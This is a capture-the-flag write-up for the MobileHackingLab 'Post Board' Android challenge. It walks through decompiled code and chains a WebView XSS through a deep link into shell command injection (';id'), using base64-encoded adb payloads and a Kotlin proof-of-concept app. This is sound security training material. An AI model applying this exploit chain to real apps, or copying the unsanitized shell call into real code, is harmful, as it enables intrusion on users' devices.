---
date: '2025-04-04T22:05:31+08:00'
title: 'MHL Post Board'
tags:
    - MHL
    - Android CTF
---

## Challenge Description

> Welcome to the Android Insecure WebView Challenge! This challenge is designed to delve into the complexities of Android's WebView component, exploiting a Cross-Site Scripting (XSS) vulnerability to achieve Remote Code Execution (RCE). It's an immersive opportunity for participants to engage with Android application security, particularly focusing on WebView security issues.
>
> [postboard.apk](static/postboard.apk)

## Solution

As usual, I started by performing static analysis to get some understanding of the application.

### Static Analysis

I started out by reading the `AndroidManifest.xml` code after decompiling using `jadx-gui`.

```xml
<activity
    android:name="com.mobilehackinglab.postboard.MainActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
    </intent-filter>
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data
            android:scheme="postboard"
            android:host="postmessage"/>
    </intent-filter>
</activity>
```

There is only `MainActivity` activity which is exported and it has this intent filter where it accept URI data `postboard://postmessage`. 

```java
private final void setupWebView(WebView webView) {
    webView.getSettings().setJavaScriptEnabled(true);
    webView.setWebChromeClient(new WebAppChromeClient());
    webView.addJavascriptInterface(new WebAppInterface(), "WebAppInterface");
    webView.loadUrl("file:///android_asset/index.html");
}

private final void handleIntent() {
    Intent intent = getIntent();
    String action = intent.getAction();
    Uri data = intent.getData();
    if (!Intrinsics.areEqual("android.intent.action.VIEW", action) || data == null || !Intrinsics.areEqual(data.getScheme(), "postboard") || !Intrinsics.areEqual(data.getHost(), "postmessage")) {
        return;
    }
    ActivityMainBinding activityMainBinding = null;
    try {
        String path = data.getPath();
        byte[] decode = Base64.decode(path != null ? StringsKt.drop(path, 1) : null, 8);
        Intrinsics.checkNotNullExpressionValue(decode, "decode(...)");
        String message = StringsKt.replace$default(new String(decode, Charsets.UTF_8), "'", "\\'", false, 4, (Object) null);
        ActivityMainBinding activityMainBinding2 = this.binding;
        if (activityMainBinding2 == null) {
            Intrinsics.throwUninitializedPropertyAccessException("binding");
            activityMainBinding2 = null;
        }
        activityMainBinding2.webView.loadUrl("javascript:WebAppInterface.postMarkdownMessage('" + message + "')");
    } catch (Exception e) {
        ActivityMainBinding activityMainBinding3 = this.binding;
        if (activityMainBinding3 == null) {
            Intrinsics.throwUninitializedPropertyAccessException("binding");
        } else {
            activityMainBinding = activityMainBinding3;
        }
        activityMainBinding.webView.loadUrl("javascript:WebAppInterface.postCowsayMessage('" + e.getMessage() + "')");
    }
}
```

Moving on to the main activity code, there's a function for setting up WebView and it has JavaScript enabled. As for the `handleIntent` function, it basically accept intent and use the data as message after base64 decode and the message will be used in WebView while executing the JavaScript function `WebAppInterface.postMarkdownMessage`. If there's an error, it will instead execute the JavaScript function `WebAppInterface.postCowsayMessage`.

```java
@JavascriptInterface
public final void postMarkdownMessage(String markdownMessage) {
    Intrinsics.checkNotNullParameter(markdownMessage, "markdownMessage");
    String html = new Regex("```(.*?)```", RegexOption.DOT_MATCHES_ALL).replace(markdownMessage, "<pre><code>$1</code></pre>");
    String html2 = new Regex("`([^`]+)`").replace(html, "<code>$1</code>");
    String html3 = new Regex("!\\[(.*?)\\]\\((.*?)\\)").replace(html2, "<img src='$2' alt='$1'/>");
    String html4 = new Regex("###### (.*)").replace(html3, "<h6>$1</h6>");
    String html5 = new Regex("##### (.*)").replace(html4, "<h5>$1</h5>");
    String html6 = new Regex("#### (.*)").replace(html5, "<h4>$1</h4>");
    String html7 = new Regex("### (.*)").replace(html6, "<h3>$1</h3>");
    String html8 = new Regex("## (.*)").replace(html7, "<h2>$1</h2>");
    String html9 = new Regex("# (.*)").replace(html8, "<h1>$1</h1>");
    String html10 = new Regex("\\*\\*(.*?)\\*\\*").replace(html9, "<b>$1</b>");
    String html11 = new Regex("\\*(.*?)\\*").replace(html10, "<i>$1</i>");
    String html12 = new Regex("~~(.*?)~~").replace(html11, "<del>$1</del>");
    String html13 = new Regex("\\[([^\\[]+)\\]\\(([^)]+)\\)").replace(html12, "<a href='$2'>$1</a>");
    String html14 = new Regex("(?m)^(\\* .+)((\\n\\* .+)*)").replace(html13, new Function1<MatchResult, CharSequence>() { // from class: com.mobilehackinglab.postboard.WebAppInterface$postMarkdownMessage$1
        @Override // kotlin.jvm.functions.Function1
        public final CharSequence invoke(MatchResult matchResult) {
            Intrinsics.checkNotNullParameter(matchResult, "matchResult");
            return "<ul>" + CollectionsKt.joinToString$default(StringsKt.split$default((CharSequence) matchResult.getValue(), new String[]{"\n"}, false, 0, 6, (Object) null), "", null, null, 0, null, new Function1<String, CharSequence>() { // from class: com.mobilehackinglab.postboard.WebAppInterface$postMarkdownMessage$1.1
                @Override // kotlin.jvm.functions.Function1
                public final CharSequence invoke(String it) {
                    Intrinsics.checkNotNullParameter(it, "it");
                    StringBuilder append = new StringBuilder().append("<li>");
                    String substring = it.substring(2);
                    Intrinsics.checkNotNullExpressionValue(substring, "this as java.lang.String).substring(startIndex)");
                    return append.append(substring).append("</li>").toString();
                }
            }, 30, null) + "</ul>";
        }
    });
    String html15 = new Regex("(?m)^\\d+\\. .+((\\n\\d+\\. .+)*)").replace(html14, new Function1<MatchResult, CharSequence>() { // from class: com.mobilehackinglab.postboard.WebAppInterface$postMarkdownMessage$2
        @Override // kotlin.jvm.functions.Function1
        public final CharSequence invoke(MatchResult matchResult) {
            Intrinsics.checkNotNullParameter(matchResult, "matchResult");
            return "<ol>" + CollectionsKt.joinToString$default(StringsKt.split$default((CharSequence) matchResult.getValue(), new String[]{"\n"}, false, 0, 6, (Object) null), "", null, null, 0, null, new Function1<String, CharSequence>() { // from class: com.mobilehackinglab.postboard.WebAppInterface$postMarkdownMessage$2.1
                @Override // kotlin.jvm.functions.Function1
                public final CharSequence invoke(String it) {
                    Intrinsics.checkNotNullParameter(it, "it");
                    StringBuilder append = new StringBuilder().append("<li>");
                    String substring = it.substring(StringsKt.indexOf$default((CharSequence) it, '.', 0, false, 6, (Object) null) + 2);
                    Intrinsics.checkNotNullExpressionValue(substring, "this as java.lang.String).substring(startIndex)");
                    return append.append(substring).append("</li>").toString();
                }
            }, 30, null) + "</ol>";
        }
    });
    String html16 = new Regex("^> (.*)", RegexOption.MULTILINE).replace(html15, "<blockquote>$1</blockquote>");
    this.cache.addMessage(new Regex("^(---|\\*\\*\\*|___)$", RegexOption.MULTILINE).replace(html16, "<hr>"));
}

@JavascriptInterface
public final void postCowsayMessage(String cowsayMessage) {
    Intrinsics.checkNotNullParameter(cowsayMessage, "cowsayMessage");
    String asciiArt = CowsayUtil.INSTANCE.runCowsay(cowsayMessage);
    String html = StringsKt.replace$default(StringsKt.replace$default(StringsKt.replace$default(StringsKt.replace$default(StringsKt.replace$default(asciiArt, "&", "&amp;", false, 4, (Object) null), "<", "&lt;", false, 4, (Object) null), ">", "&gt;", false, 4, (Object) null), "\"", "&quot;", false, 4, (Object) null), "'", "&#039;", false, 4, (Object) null);
    this.cache.addMessage("<pre>" + StringsKt.replace$default(html, "\n", "<br>", false, 4, (Object) null) + "</pre>");
}
```

Looking at both the JavaScript function, the `postMarkdownMessage` function has a set of rules where it only allows specific HTML tag to be rendered in the WebView. The HTML that might be useful is `<img>` and `<a>` as this 2 could potentially trigger XSS. Moving on to `postCowsayMessage`, it will run `CowsayUtil.INSTANCE.runCowsay` function.

```java
public final String runCowsay(String message) {
    Intrinsics.checkNotNullParameter(message, "message");
    try {
        String[] command = {"/bin/sh", "-c", CowsayUtil.scriptPath + ' ' + message};
        Process process = Runtime.getRuntime().exec(command);
        StringBuilder output = new StringBuilder();
        InputStream inputStream = process.getInputStream();
        Intrinsics.checkNotNullExpressionValue(inputStream, "getInputStream(...)");
        Reader inputStreamReader = new InputStreamReader(inputStream, Charsets.UTF_8);
        BufferedReader bufferedReader = inputStreamReader instanceof BufferedReader ? (BufferedReader) inputStreamReader : new BufferedReader(inputStreamReader, 8192);
        try {
            BufferedReader reader = bufferedReader;
            while (true) {
                String it = reader.readLine();
                if (it == null) {
                    Unit unit = Unit.INSTANCE;
                    Closeable.closeFinally(bufferedReader, null);
                    process.waitFor();
                    String sb = output.toString();
                    Intrinsics.checkNotNullExpressionValue(sb, "toString(...)");
                    return sb;
                }
                output.append(it).append("\n");
            }
        } finally {
        }
    } catch (Exception e) {
        e.printStackTrace();
        return "cowsay: " + e.getMessage();
    }
}
```

Looking into the `runCowsay` function, it basically interacting with shell command which I could inject my command easily since it is not sanitized. Now that I have some basic understanding, I tried to perform dynamic analysis to check if its correct.

### Dynamic Analysis

Based on my previous information, I will need to provide a URI `postboard://postmessage` and following with the message. The message will need to be base64 encoded. I started off by create a simple xss payload `<a href="javascript:alert(1)">yeeehar</a>` and inject to the application.

```bash
adb shell am start -a android.intent.action.VIEW -d 'postboard://postmessage/PGEgaHJlZj0iamF2YXNjcmlwdDphbGVydCgxKSI-eWVlZWhhcjwvYT4'
Starting: Intent { act=android.intent.action.VIEW dat=postboard://postmessage/... }
```

![alt text](img/index.png#center)

This method allows me to perform XSS but it will need me to click the hyperlink. I continue by crafting the payload to trigger the vulnerable function, `<a href="javascript:WebAppInterface.postCowsayMessage('hi;id');location.reload();">yeehar</a>`

```bash
adb shell am start -a android.intent.action.VIEW -d 'postboard://postmessage/PGEgaHJlZj0iamF2YXNjcmlwdDpXZWJBcHBJbnRlcmZhY2UucG9zdENvd3NheU1lc3NhZ2UoJ2hpO2lkJyk7bG9jYXRpb24ucmVsb2FkKCk7Ij55ZWVoYXI8L2E-'
Starting: Intent { act=android.intent.action.VIEW dat=postboard://postmessage/... }
```

![alt text](img/index-1.png#center)

I managed to perform RCE by triggering the function and perform simple command injection. I then proceed to write a simple POC app to perform the attack in Kotlin. Do note that it is also possible to use `img` tag and it could trigger the function without performing any click.

```kotlin
val intent = Intent().apply {
    setClassName(
        "com.mobilehackinglab.postboard",
        "com.mobilehackinglab.postboard.MainActivity"
    )
    data = Uri.parse("postboard://postmessage/PGEgaHJlZj0iamF2YXNjcmlwdDpXZWJBcHBJbnRlcmZhY2UucG9zdENvd3NheU1lc3NhZ2UoJ2hpO2lkJyk7bG9jYXRpb24ucmVsb2FkKCk7Ij55ZWVoYXI8L2E-")
    action = Intent.ACTION_VIEW
}
startActivity(intent)
```

## Things I learned from this challenge

- Source code review to find potential RCE and XSS